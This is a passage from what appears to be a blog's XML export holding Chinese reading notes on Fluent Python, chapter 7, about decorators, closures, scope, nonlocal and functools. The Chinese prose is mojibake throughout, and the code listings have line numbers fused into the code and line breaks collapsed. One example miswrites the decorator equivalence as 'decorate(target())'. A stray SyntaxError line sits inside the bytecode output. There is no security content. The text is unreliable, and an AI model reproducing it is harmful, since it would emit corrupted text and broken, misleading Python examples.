dictå®ä¾‹ä¸èƒ½ä½œä¸ºæ‰€æŒ‡å¯¹è±¡ï¼Œä½†æ˜¯å®ƒä»¬çš„å­ç±»å¯ä»¥ï¼Œint å’Œ tuple å®ä¾‹ä¸èƒ½ä½œä¸ºå¼±å¼•ç”¨çš„ç›®æ ‡ï¼Œç”šè‡³å®ƒä»¬çš„å­ç±»ä¹Ÿä¸è¡Œã€‚ å°ç»“æ¯ä¸ª Python å¯¹è±¡éƒ½æœ‰æ ‡è¯†ã€ç±»å‹å’Œå€¼ã€‚åªæœ‰å¯¹è±¡çš„å€¼ä¼šä¸æ—¶å˜åŒ–ã€‚ å˜é‡ä¿å­˜çš„æ˜¯å¼•ç”¨ï¼Œè¿™ä¸€ç‚¹å¯¹ Python ç¼–ç¨‹æœ‰å¾ˆå¤šå®é™…çš„å½±å“ã€‚ ç®€å•çš„èµ‹å€¼ä¸åˆ›å»ºå‰¯æœ¬ã€‚ å¯¹ += æˆ– *= æ‰€åšçš„å¢é‡èµ‹å€¼æ¥è¯´ï¼Œå¦‚æœå·¦è¾¹çš„å˜é‡ç»‘å®šçš„æ˜¯ä¸å¯å˜å¯¹è±¡ï¼Œä¼šåˆ›å»ºæ–°å¯¹è±¡ï¼›å¦‚æœæ˜¯å¯å˜å¯¹è±¡ï¼Œä¼šå°±åœ°ä¿®æ”¹ã€‚ ä¸ºç°æœ‰çš„å˜é‡èµ‹äºˆæ–°å€¼ï¼Œä¸ä¼šä¿®æ”¹ä¹‹å‰ç»‘å®šçš„å˜é‡ã€‚è¿™å«é‡æ–°ç»‘å®šï¼šç°åœ¨å˜é‡ç»‘å®šäº†å…¶ä»–å¯¹è±¡ã€‚å¦‚æœå˜é‡æ˜¯ä¹‹å‰é‚£ä¸ªå¯¹è±¡çš„æœ€åä¸€ä¸ªå¼•ç”¨ï¼Œå¯¹è±¡ä¼šè¢«å½“ä½œåƒåœ¾å›æ”¶ã€‚ å‡½æ•°çš„å‚æ•°ä»¥åˆ«åçš„å½¢å¼ä¼ é€’ï¼Œè¿™æ„å‘³ç€ï¼Œå‡½æ•°å¯èƒ½ä¼šä¿®æ”¹é€šè¿‡å‚æ•°ä¼ å…¥çš„å¯å˜å¯¹è±¡ã€‚è¿™ä¸€è¡Œä¸ºæ— æ³•é¿å…ï¼Œé™¤éåœ¨æœ¬åœ°åˆ›å»ºå‰¯æœ¬ï¼Œæˆ–è€…ä½¿ç”¨ä¸å¯å˜å¯¹è±¡ï¼ˆä¾‹å¦‚ï¼Œä¼ å…¥å…ƒç»„ï¼Œè€Œä¸ä¼ å…¥åˆ—è¡¨ï¼‰ã€‚ ä½¿ç”¨å¯å˜ç±»å‹ä½œä¸ºå‡½æ•°å‚æ•°çš„é»˜è®¤å€¼æœ‰å±é™©ï¼Œå› ä¸ºå¦‚æœå°±åœ°ä¿®æ”¹äº†å‚æ•°ï¼Œé»˜è®¤å€¼ä¹Ÿå°±å˜äº†ï¼Œè¿™ä¼šå½±å“ä»¥åä½¿ç”¨é»˜è®¤å€¼çš„è°ƒç”¨ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>å¯¹è±¡å¼•ç”¨</tag>
        <tag>åƒåœ¾å›æ”¶</tag>
        <tag>Mutability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python ç¬¬ä¸ƒç« å°ç»“]]></title>
    <url>%2F2017%2F12%2F19%2Ffluent-python-7%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬ä¸ƒç« è¯»ä¹¦æŠ¥å‘Š Chapter 7. Function Decorators and Closuresç¬¬ä¸ƒç« : å‡½æ•°è£…é¥°å™¨å’Œå‡½æ•°é—­åŒ…å‡½æ•°è£…é¥°å™¨ä½¿ç”¨ç‰¹æ®Šçš„æ ‡è®°å¢å¼ºå‡½æ•°ï¼Œè¦æƒ³æŒæ¡è£…é¥°å™¨ï¼Œé¦–å…ˆè¦ç†è§£å‡½æ•°é—­åŒ…ã€‚nonlocal æ˜¯åœ¨Python3 ä¸­å¼•å…¥çš„ä¿ç•™å…³é”®å­—ï¼Œå¦‚æœè¦ä½¿ç”¨å‡½æ•°é—­åŒ…å’Œè£…é¥°å™¨ï¼Œä¹Ÿå¿…é¡»è¦äº†è§£nonlocalã€‚å¦å¤–ï¼Œé—­åŒ…åŒæ—¶ä¹Ÿæ˜¯å‡½æ•°å¼ç¼–ç¨‹å’Œå›è°ƒå¼å¼‚æ­¥ç¼–ç¨‹çš„åŸºç¡€ã€‚è¿™ä¸€å¼ è¦è®¨è®ºçš„è¯é¢˜:åŸºç¡€çŸ¥è¯†ï¼š python è®¡ç®—è£…é¥°å™¨å¥æ³• python å¦‚ä½•åˆ¤æ–­å˜é‡æ˜¯å¦æ˜¯å±€éƒ¨çš„ é—­åŒ…å­˜åœ¨çš„åŸå› å’Œå·¥ä½œåŸç† nonlocal å¯ä»¥è§£å†³çš„é—®é¢˜ è¿›ä¸€æ­¥æ¢è®¨è£…é¥°å™¨: å®ç°è¡Œä¸ºè‰¯å¥½çš„è£…é¥°å™¨ æ ‡å‡†åº“ä¸­æœ‰ç”¨çš„è£…é¥°å™¨ å®ç°å‚æ•°åŒ–è£…é¥°å™¨ è£…é¥°å™¨åŸºç¡€çŸ¥è¯†è£…é¥°å™¨æ˜¯ä¸€ä¸ªå¯è°ƒç”¨çš„å¯¹è±¡ï¼Œå®ƒçš„å‚æ•°æ˜¯å¦ä¸€ä¸ªå‡½æ•°ï¼ˆè¢«è£…é¥°çš„å‡½æ•°ï¼‰ï¼Œè£…é¥°å™¨å¯èƒ½ä¼šå°†è¾“å…¥çš„å‡½æ•°è¿›è¡Œå¤„ç†è¿”å›ç»“æœï¼Œæˆ–è€…å°†å…¶æ›¿æ¢æˆå¦ä¸€ä¸ªå‡½æ•°æˆ–è€…å¯è°ƒç”¨å¯¹è±¡ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­, å‡è®¾æœ‰ä¸€ä¸ªåä¸ºdecorateçš„è£…é¥°å™¨: 12345@decoratedef target(): print('running target()') # ç­‰ä»·äºä¸‹é¢çš„å†™æ³•target = decorate(target()) ä¸Šè¿°ä¸¤æ®µä»£ç å¾—åˆ°çš„targetå‡½æ•°éƒ½æ˜¯ç»è¿‡decrateå¤„ç†è¿‡çš„, ä¸‹é¢çš„æ§åˆ¶å°ä¼šè¯è¯æ˜äº†è¿™ç‚¹: 12345678910111213&gt;&gt;&gt; def deco(func):... def inner():... print('running inner()')... return inner...&gt;&gt;&gt; @deco... def target():... print('running target()')...&gt;&gt;&gt; target()running inner()&gt;&gt;&gt; target&lt;function deco.&lt;locals&gt;.inner at 0x10063b598&gt; å¯ä»¥çœ‹åˆ°target å·²ç»è¢«æ›¿æ¢æˆäº†inner,ä¸¥æ ¼æ¥è¯´targetç°åœ¨æ˜¯innerçš„å¼•ç”¨ã€‚ Pythonä½•æ—¶æ‰§è¡Œè£…é¥°å™¨è£…é¥°å™¨çš„ä¸€å¤§ç‰¹æ€§æ˜¯ï¼Œèƒ½æŠŠè¢«è£…é¥°çš„å‡½æ•°æ›¿æ¢æˆå…¶ä»–å‡½æ•°ï¼Œç¬¬äºŒä¸ªç‰¹æ€§æ˜¯è£…é¥°å™¨åŠ è½½æ¨¡å—æ—¶ä¼šç«‹å³æ‰§è¡Œã€‚ç¬¬äºŒä¸ªç‰¹æ€§çœ‹å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­: 12345678910111213141516171819202122registry = []def register(func): print('running register(%s)' % func) registry.append(func) return func@registerdef f1(): print('running f1()')@registerdef f2(): print('running f2()')def f3(): print('running f3()')def main(): print('running main()') print('registry -&gt;', registry) f1() f2() f3()if __name__=='__main__': main() æ§åˆ¶å°è¾“å‡ºå¦‚ä¸‹: 1234567running register(&lt;function f1 at 0x10320eb70&gt;)running register(&lt;function f2 at 0x10320eae8&gt;)running main()registry -&gt; [&lt;function f1 at 0x10320eb70&gt;, &lt;function f2 at 0x10320eae8&gt;]running f1()running f2()running f3() å¦‚æœæ˜¯å¯¼å…¥:12345&gt;&gt;&gt; import registerationrunning register(&lt;function f1 at 0x1100480d0&gt;)running register(&lt;function f2 at 0x110048158&gt;)&gt;&gt;&gt; registeration.registry[&lt;function f1 at 0x1100480d0&gt;, &lt;function f2 at 0x110048158&gt;] ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼šå‡½æ•°è£…é¥°å™¨åœ¨å¯¼å…¥æ¨¡å—æ—¶ç«‹å³æ‰§è¡Œï¼Œè€Œè¢«è£…é¥°çš„å‡½æ•°åªåœ¨æ˜ç¡®è°ƒç”¨æ—¶è¿è¡Œã€‚è¿™çªå‡ºäº† Python çš„å¯¼å…¥æ—¶å’Œè¿è¡Œæ—¶ä¹‹é—´çš„åŒºåˆ«ã€‚ è¿™é‡Œæåˆ°è£…é¥°å™¨çš„é€šå¸¸ç”¨æ³•å’Œregisteration.pyä¸­çš„ä¸åŒ: ä¾‹å­ä¸­çš„è£…é¥°å™¨å‡½æ•°ä¸è¢«è£…é¥°çš„å‡½æ•°åœ¨åŒä¸€ä¸ªæ¨¡å—ä¸­å®šä¹‰ã€‚å®é™…æƒ…å†µæ˜¯ï¼Œè£…é¥°å™¨é€šå¸¸åœ¨ä¸€ä¸ªæ¨¡å—ä¸­å®šä¹‰ï¼Œç„¶ååº”ç”¨åˆ°å…¶ä»–æ¨¡å—ä¸­çš„å‡½æ•°ä¸Šã€‚ ä¾‹å­ä¸­çš„ register ä½¿ç”¨è£…é¥°å™¨æ”¹è¿›ç­–ç•¥æ¨¡å¼åœ¨ä½¿ç”¨ä¸€ç­‰å¯¹è±¡çš„ç‰¹æ€§å®ç°ç­–ç•¥æ¨¡å¼æ—¶ï¼Œæ›¾ç»è¯´è¿‡ï¼Œå½“æ—¶çš„å®ç°æœ‰ä¸€äº›é—®é¢˜ï¼Œå°±æ˜¯å¦‚ä½•æ–¹ä¾¿çš„éå†æ‰€æœ‰çš„ç­–ç•¥ä»¥è·å–æœ€ä½³çš„æŠ˜æ‰£ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è£…é¥°å™¨å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ 1234567891011121314151617181920212223242526promos = []def promotion(promo_func): promos.append(promo_func) return promo_func@promotiondef fidelity(order): """ä¸ºç§¯åˆ†ä¸º1000æˆ–ä»¥ä¸Šçš„é¡¾å®¢æä¾›5%æŠ˜æ‰£""" return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0@promotion def bulk_item(order): """å•ä¸ªå•†å“ä¸º20ä¸ªæˆ–ä»¥ä¸Šæ—¶æä¾›10%æŠ˜æ‰£""" discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discount@promotiondef large_order(order): """è®¢å•ä¸­çš„ä¸åŒå•†å“è¾¾åˆ°10ä¸ªæˆ–ä»¥ä¸Šæ—¶æä¾›7%æŠ˜æ‰£""" distinct_items = &#123;item.product for item in order.cart&#125; if len(distinct_items) &gt;= 10: return order.total() * .07 return 0def best_promo(order): """é€‰æ‹©å¯ç”¨çš„æœ€ä½³æŠ˜æ‰£""" return max(promo(order) for promo in promos) è¿™æ ·åšçš„å¥½å¤„æœ‰: ç­–ç•¥å‡½æ•°æ— é¡»ä½¿ç”¨ç‰¹æ®Šçš„åç§°ä½œåŒºåˆ† @promotion è£…é¥°å™¨æ—¢å¯ä»¥å¢åŠ ç­–ç•¥ï¼Œä¹Ÿå¯ä»¥æ–¹ä¾¿ç¦ç”¨ç­–ç•¥ï¼ˆæ³¨é‡Šæ‰è£…é¥°å™¨å³å¯ï¼‰ ç­–ç•¥å‡½æ•°å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹å®šä¹‰ï¼Œåªéœ€è¦ä½¿ç”¨@promotionè£…é¥°å™¨ å¤šæ•°è£…é¥°å™¨ä¼šä¿®æ”¹è¢«è£…é¥°çš„å‡½æ•°ã€‚é€šå¸¸ï¼Œå®ƒä»¬ä¼šå®šä¹‰ä¸€ä¸ªå†…éƒ¨å‡½æ•°ï¼Œç„¶åå°†å…¶è¿”å›ï¼Œæ›¿æ¢è¢«è£…é¥°çš„å‡½æ•°ã€‚ä½¿ç”¨å†…éƒ¨å‡½æ•°çš„ä»£ç å‡ ä¹éƒ½è¦é é—­åŒ…æ‰èƒ½æ­£ç¡®è¿ä½œã€‚ä¸ºäº†ç†è§£é—­åŒ…ï¼Œæˆ‘ä»¬è¦å…ˆäº†è§£ Python ä¸­çš„å˜é‡ä½œç”¨åŸŸã€‚ Pythonä¸­å˜é‡çš„ä½œç”¨åŸŸä¸‹é¢çš„ä¸€ç³»åˆ—æ§åˆ¶å°äº¤äº’å¯ä»¥è®©æˆ‘ä»¬æ›´åŠ äº†è§£Pythonçš„å˜é‡ä½œç”¨åŸŸï¼š 12345678910&gt;&gt;&gt; def f1(a):... print(a)... print(b)...&gt;&gt;&gt; f1(3)3Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; File "&lt;stdin&gt;", line 3, in f1NameError: name 'b' is not defined è¿™ä¸ªä¾‹å­ä¸­ç”±äºæ²¡æœ‰å®šä¹‰å…¨å±€å˜é‡bå¯¼è‡´æŠ¥é”™ 1234&gt;&gt;&gt; b = 6&gt;&gt;&gt; f1(3)36 è¿™é‡Œå®šä¹‰äº†å…¨å±€å˜é‡b,æ­£å¸¸è¿è¡Œ 123456789101112&gt;&gt;&gt; def f2(a):... print(a)... print(b)... b = 6...&gt;&gt;&gt; b = 3&gt;&gt;&gt; f2(3)3Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; File "&lt;stdin&gt;", line 3, in f2UnboundLocalError: local variable 'b' referenced before assignment è¿™é‡Œç”±äºå‡½æ•°f2çš„å®šä¹‰ä½“ä¸­ç»™bèµ‹å€¼äº†ï¼Œå¯¼è‡´f2åˆ¤æ–­bæ˜¯å±€éƒ¨å˜é‡ã€‚ è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°Pythonå¯¹å˜é‡çš„ä¸€ä¸ªè®¾è®¡: Python ä¸è¦æ±‚å£°æ˜å˜é‡ï¼Œä½†æ˜¯å‡å®šåœ¨å‡½æ•°å®šä¹‰ä½“ä¸­èµ‹å€¼çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯å¯ä»¥é˜²æ­¢åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä½¿ç”¨å…¨å±€å˜é‡ã€‚å¦‚æœä¹Ÿè¦åœ¨å‡½æ•°å®šä¹‰ä½“ä¸­å¯¹å…¨å±€å˜é‡èµ‹å€¼ï¼Œåªéœ€è¦ç”¨globalå£°æ˜ï¼š 12345678910111213&gt;&gt;&gt; def f3(a):... global b... print(a)... print(b)... b = 6...&gt;&gt;&gt; b = 3&gt;&gt;&gt; f3(b)33&gt;&gt;&gt; b6&gt;&gt;&gt; ä¸ºäº†æ·±å…¥ç†è§£ä¸€ä¸‹f1/f2è¿™ä¸¤ä¸ªå‡½æ•°çš„å˜é‡åŠ è½½æ–¹å¼ï¼Œå¯ä»¥ä½¿ç”¨disæ¨¡å—åæ±‡ç¼–ï¼ŒæŸ¥çœ‹å­—èŠ‚ç ï¼š 1234567891011121314151617181920212223242526272829&gt;&gt;&gt; dis(f1) 2 0 LOAD_GLOBAL 0 (print) 2 LOAD_FAST 0 (a) 4 CALL_FUNCTION 1 6 POP_TOP 3 8 LOAD_GLOBAL 0 (print) 10 LOAD_GLOBAL 1 (b) #å…¨å±€å˜é‡ 12 CALL_FUNCTION 1 14 POP_TOP 16 LOAD_CONST 0 (None) 18 RETURN_VALUESyntaxError: invalid syntax&gt;&gt;&gt; dis(f2) 2 0 LOAD_GLOBAL 0 (print) 2 LOAD_FAST 0 (a) 4 CALL_FUNCTION 1 6 POP_TOP 3 8 LOAD_GLOBAL 0 (print) 10 LOAD_FAST 1 (b) #å±€éƒ¨å˜é‡ 12 CALL_FUNCTION 1 14 POP_TOP 4 16 LOAD_CONST 1 (6) 18 STORE_FAST 1 (b) 20 LOAD_CONST 0 (None) 22 RETURN_VALUE 7.5 é—­åŒ…é—­åŒ…æŒ‡å»¶ä¼¸äº†ä½œç”¨åŸŸçš„å‡½æ•°ï¼Œå…¶ä¸­åŒ…å«å‡½æ•°å®šä¹‰ä½“ä¸­å¼•ç”¨ã€ä½†æ˜¯ä¸åœ¨å®šä¹‰ä½“ä¸­å®šä¹‰çš„éå…¨å±€å˜é‡ã€‚å‡½æ•°æ˜¯ä¸æ˜¯åŒ¿åçš„æ²¡æœ‰å…³ç³»ï¼Œå…³é”®æ˜¯å®ƒèƒ½è®¿é—®å®šä¹‰ä½“ä¹‹å¤–å®šä¹‰çš„éå…¨å±€å˜é‡ã€‚è¿™ä¸ªæ¦‚å¿µéå¸¸æŠ½è±¡ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ›´å¥½åœ°ç†è§£å®ƒ: å‡å¦‚æœ‰ä¸ªåä¸º avg çš„å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è®¡ç®—ä¸æ–­å¢åŠ çš„ç³»åˆ—å€¼çš„å‡å€¼ï¼›ä¾‹å¦‚ï¼Œæ•´ä¸ªå†å²ä¸­æŸä¸ªå•†å“çš„å¹³å‡æ”¶ç›˜ä»·ã€‚æ¯å¤©éƒ½ä¼šå¢åŠ æ–°ä»·æ ¼ï¼Œå› æ­¤å¹³å‡å€¼è¦è€ƒè™‘è‡³ç›®å‰ä¸ºæ­¢æ‰€æœ‰çš„ä»·æ ¼ã€‚ é¦–å…ˆçœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„é¢å¯¹å¯¹è±¡å®ç°: 1234567class Averager(): def __init__(self): self.series = [] def __call__(self, new_value): self.series.append(new_value) total = sum(self.series) return total/len(self.series) å…¶ä¸­Averager()æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œåˆ›å»ºAveragerçš„å®ä¾‹å°±å¯ä»¥è¾¾æˆä¸Šé¢æ‰€è¯´çš„è¦æ±‚ã€‚ >>> avg = Averager()>>> avg(10)10.0>>> avg(11)10.5>>> avg(12)11.0 æ¥ä¸‹æ¥æ˜¯å‡½æ•°å¼å®ç°ï¼Œä½¿ç”¨é«˜é˜¶å‡½æ•°make_averager: 1234567def make_averager(): series = [] def averager(new_value): series.append(new_value) total = sum(series) return total/len(series) return averager >>> avg = make_averager()>>> avg(10) 10.0>>> avg(11) 10.5>>> avg(12) 11.0 è¿™ä¸¤ä¸ªç¤ºä¾‹çš„ç›¸åŒç‚¹: éƒ½æ˜¯é€šè¿‡æ›´æ–°å†å²å€¼å†è¿›è¡Œå¹³å‡å€¼è®¡ç®—ã€‚é—®é¢˜åœ¨äºæ•°æ®çš„å­˜å‚¨ï¼Œé¢å¯¹å¯¹è±¡å®ç°æ˜¯å­˜å‚¨åœ¨å®ä¾‹å±æ€§self.seriesä¸­çš„ï¼Œè€Œmake_averageræ˜¯å­˜å‚¨åœ¨seriesä¸­çš„ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œåœ¨ avg = make_averager() è¿™å¥æ‰§è¡Œä»¥åï¼Œmake_averagerå‡½æ•°å·²ç»è¿”å›äº†ï¼Œè¿™æ—¶seriesçš„æœ¬åœ°ä½œç”¨åŸŸå·²ç»ä¸å­˜åœ¨äº†ã€‚ è€Œåœ¨averagerä¸­ï¼Œseriesæ˜¯è‡ªç”±å˜é‡ï¼ˆfree variableï¼‰,æŒ‡æœªåœ¨æœ¬åœ°ä½œç”¨åŸŸä¸­ç»‘å®šçš„å˜é‡ã€‚ æ¥ä¸‹æ¥å®¡æŸ¥averagerå¯¹è±¡ï¼Œæˆ‘ä»¬å‘ç°Pythonåœ¨__code__å±æ€§ä¸­ä¿å­˜å±€éƒ¨å˜é‡å’Œè‡ªç”±å˜é‡çš„åç§°ã€‚ 1234567&gt;&gt;&gt; from averager import make_averager&gt;&gt;&gt;&gt;&gt;&gt; avg = make_averager()&gt;&gt;&gt; avg.__code__.co_varnames('new_value', 'total')&gt;&gt;&gt; avg.__code__.co_freevars('series',) series ç»‘å®šåœ¨ avg.__closure__å±æ€§ä¸­ 1234567891011121314&gt;&gt;&gt; avg.__closure__[0].cell_contents[]&gt;&gt;&gt; avg(10)10.0&gt;&gt;&gt; avg.__closure__[0].cell_contents[10]&gt;&gt;&gt; avg(11)10.5&gt;&gt;&gt; avg.__closure__[0].cell_contents[10, 11]&gt;&gt;&gt; avg(13)11.333333333333334&gt;&gt;&gt; avg.__closure__[0].cell_contents[10, 11, 13] è¿™æ ·æˆ‘ä»¬å¯ä»¥å¾ˆå½¢è±¡çš„ç†è§£é—­åŒ…çš„æ€§è´¨äº†ï¼Œé—­åŒ…æ˜¯ä¸€ç§å‡½æ•°ï¼Œå®ƒä¼šä¿ç•™å®šä¹‰å‡½æ•°æ—¶å­˜åœ¨çš„è‡ªç”±å˜é‡çš„ç»‘å®šï¼Œè¿™æ ·è°ƒç”¨å‡½æ•°æ—¶ï¼Œè™½ç„¶å®šä¹‰ä½œç”¨åŸŸä¸å¯ç”¨äº†ï¼Œä½†æ˜¯ä»èƒ½ä½¿ç”¨é‚£äº›ç»‘å®šã€‚ åªæœ‰åµŒå¥—åœ¨å…¶ä»–å‡½æ•°ä¸­çš„å‡½æ•°æ‰å¯èƒ½éœ€è¦å¤„ç†ä¸åœ¨å…¨å±€ä½œç”¨åŸŸä¸­çš„å¤–éƒ¨å˜é‡ï¼Œè¿™ä¹Ÿæ˜¯åŒ¿åå‡½æ•°å®¹æ˜“å’Œé—­åŒ…æ··æ·†çš„ä¸€ä¸ªåŸå› ã€‚ nonlocalå£°æ˜å‰é¢å®ç°çš„make_averagerå‡½æ•°çš„æ•ˆç‡å¹¶ä¸é«˜ï¼Œå› ä¸ºæ¯æ¬¡è°ƒç”¨avgéƒ½è¦å¯¹æ‰€æœ‰å†å²å€¼æ±‚å’Œï¼Œå®é™…ä¸Šåªéœ€è¦å½“å‰å€¼+å†å²å€¼çš„å’Œå°±å¯ä»¥äº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•å¯¹ä»£ç è¿›è¡Œä¸€äº›ä¼˜åŒ–: 12345678def make_averager_v1(): count = 0 total = 0 def averager(new_value): count += 1 total += new_value return total / count return averager æ§åˆ¶å°è¾“å‡ºå¦‚ä¸‹:123456789&gt;&gt;&gt; from averager import make_averager_v1&gt;&gt;&gt; avg = make_averager_v1()&gt;&gt;&gt; avg(10)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt; File "/Users/NickAl/study/github/readings/Fluent-Python/7. Function Decorators and Closures/averager.py", line 13, in averager count += 1UnboundLocalError: local variable 'count' referenced before assignment&gt;&gt;&gt; ç”±äºå‡½æ•°çš„å®šä¹‰ä½“å¯¹countèµ‹å€¼äº†ï¼Œç”±äºcountæ˜¯int,èµ‹å€¼ä¼šéšå¼çš„åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼Œå¯¼è‡´å‡½æ•°åˆ¤æ–­countæ˜¯å±€éƒ¨å˜é‡è€Œä¸æ˜¯è‡ªç”±å˜é‡ï¼Œä¸ä¼šä¿å­˜åœ¨é—­åŒ…ä¸­ï¼Œä¼šå¯¼è‡´æŠ›å‡ºå¼‚å¸¸ã€‚ Python3 ä¸­çš„nonlocalå£°æ˜ä¼šæŠŠå˜é‡æ ‡è®°ä¸ºè‡ªç”±å˜é‡ï¼Œä½¿å¾—å˜é‡å¯ä»¥ä¿å­˜åœ¨é—­åŒ…ä¸­ã€‚ä¸‹é¢åˆ©ç”¨nonlocalå¯¹ä¸Šé¢çš„ä»£ç è¿›è¡Œä¿®æ­£ï¼š 123456789def make_averager_v1(): count = 0 total = 0 def averager(new_value): nonlocal count, total count += 1 total += new_value return total / count return averager åœ¨æ²¡æœ‰nonlocalå£°æ˜çš„Python2ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°†å˜é‡ä½œä¸ºå€¼å­˜å‚¨åœ¨å¯å˜å¯¹è±¡ä¸­æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ å®ç°ä¸€ä¸ªç®€å•çš„è£…é¥°å™¨ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„è£…é¥°å™¨ï¼Œè¾“å‡ºå‡½æ•°çš„è¿è¡Œæ—¶é—´, clockedæ˜¯ä¸€ä¸ªé—­åŒ…ï¼Œfuncæ˜¯è‡ªç”±å˜é‡ã€‚ 1234567891011import timedef clock(func): def clocked(*args): t0 = time.perf_counter() result = func(*args) elapsed = time.perf_counter() - t0 name = func.__name__ arg_str = ', '.join(repr(arg) for arg in args) print('[%0.8fs] %s(%s) -&gt; %r' % (elapsed, name, arg_str, result)) return result return clocked ä¸‹é¢çš„Pythonä»£ç å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨è¿™ä¸ªè£…é¥°å™¨: 1234567891011121314# clockdeco_demo.pyimport timefrom clockdeco import clock@clockdef snooze(seconds): time.sleep(seconds)@clockdef factorial(n): return 1 if n &lt; 2 else n*factorial(n-1)if __name__=='__main__': print('*' * 40, 'Calling snooze(.123)') snooze(.123) print('*' * 40, 'Calling factorial(6)') print('6! =', factorial(6)) è¾“å‡ºå¦‚ä¸‹: -&gt; % python3 clockdeco_demo.py** Calling snooze(.123)[0.12309374s] snooze(0.123) -&gt; None** Calling factorial(6)[0.00000162s] factorial(1) -&gt; 1[0.00003553s] factorial(2) -&gt; 2[0.00005951s] factorial(3) -&gt; 6[0.00008194s] factorial(4) -&gt; 24[0.00010441s] factorial(5) -&gt; 120[0.00013048s] factorial(6) -&gt; 7206! = 720 è¿™ä¸ªä¾‹å­ä¸­ï¼Œclockedå‚æ•°åšäº†å¦‚ä¸‹æ“ä½œ:(1) è®°å½•åˆå§‹æ—¶é—´ t0ã€‚(2) è°ƒç”¨åŸæ¥çš„ factorial å‡½æ•°ï¼Œä¿å­˜ç»“æœã€‚(3) è®¡ç®—ç»è¿‡çš„æ—¶é—´ã€‚(4) æ ¼å¼åŒ–æ”¶é›†çš„æ•°æ®ï¼Œç„¶åæ‰“å°å‡ºæ¥ã€‚(5) è¿”å›ç¬¬ 2 æ­¥ä¿å­˜çš„ç»“æœã€‚è¿™æ˜¯è£…é¥°å™¨çš„å…¸å‹è¡Œä¸ºï¼šæŠŠè¢«è£…é¥°çš„å‡½æ•°æ›¿æ¢æˆæ–°å‡½æ•°ï¼ŒäºŒè€…æ¥å—ç›¸åŒçš„å‚æ•°ï¼Œè€Œä¸”ï¼ˆé€šå¸¸ï¼‰è¿”å›è¢«è£…é¥°çš„å‡½æ•°æœ¬è¯¥è¿”å›çš„å€¼ï¼ŒåŒæ—¶è¿˜ä¼šåšäº›é¢å¤–æ“ä½œã€‚ ä¸Šé¢çš„è£…é¥°å™¨è¿˜å­˜åœ¨ä¸€äº›é—®é¢˜: ä¸æ”¯æŒå…³é”®å­—å‚æ•° é®ç›–äº†è¢«è£…é¥°çš„å‡½æ•°çš„__name__å’Œ__doc__å±æ€§ ä¸‹é¢çš„ç¤ºä¾‹è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼š 1234567891011121314151617181920#clockdeco2.pyimport timeimport functoolsdef clock(func): @functools.wraps(func) def clocked(*args, **kwargs): t0 = time.time() result = func(*args, **kwargs) elapsed = time.time() - t0 name = func.__name__ arg_lst = [] if args: arg_lst.append(', '.join(repr(arg) for arg in args)) if kwargs: pairs = ['%s=%r' % (k, w) for k, w in sorted(kwargs.items())] arg_lst.append(', '.join(pairs)) arg_str = ', '.join(arg_lst) print('[%0.8fs] %s(%s) -&gt; %r ' % (elapsed, name, arg_str, result)) return result return clocked functool.wrapæ˜¯æ ‡å‡†åº“ä¸­å¯ä»¥ç›´æ¥å–ç”¨çš„è£…é¥°å™¨ã€‚ æ ‡å‡†åº“ä¸­çš„è£…é¥°å™¨è¿™èŠ‚ä¼šè®²åˆ°functoolä¸­çš„ä¸¤ä¸ªå€¼å¾—å…³æ³¨çš„è£…é¥°å™¨: lru_cacheå’Œsingle_dispatch ä½¿ç”¨functools.lru_cacheåšå¤‡å¿˜functools.lru_cache æ˜¯éå¸¸å®ç”¨çš„è£…é¥°å™¨ï¼Œå®ƒå®ç°äº†å¤‡å¿˜ï¼ˆmemoizationï¼‰åŠŸèƒ½ã€‚è¿™æ˜¯ä¸€é¡¹ä¼˜åŒ–æŠ€æœ¯ï¼Œå®ƒæŠŠè€—æ—¶çš„å‡½æ•°çš„ç»“æœä¿å­˜èµ·æ¥ï¼Œé¿å…ä¼ å…¥ç›¸åŒçš„å‚æ•°æ—¶é‡å¤è®¡ç®—ã€‚LRUä¸‰ä¸ªå­—æ¯æ˜¯â€œLeast Recently Usedâ€çš„ç¼©å†™ï¼Œè¡¨æ˜ç¼“å­˜ä¸ä¼šæ— é™åˆ¶å¢é•¿ï¼Œä¸€æ®µæ—¶é—´ä¸ç”¨çš„ç¼“å­˜æ¡ç›®ä¼šè¢«æ‰”æ‰ã€‚ç”Ÿæˆç¬¬ n ä¸ªæ–æ³¢çº³å¥‘æ•°è¿™ç§æ…¢é€Ÿé€’å½’å‡½æ•°é€‚åˆä½¿ç”¨ lru_cacheï¼Œä¸‹é¢çš„ä»£ç æ˜¯ä¸€ä¸ªç¤ºä¾‹ 12345678from clockdeco import clock@clockdef 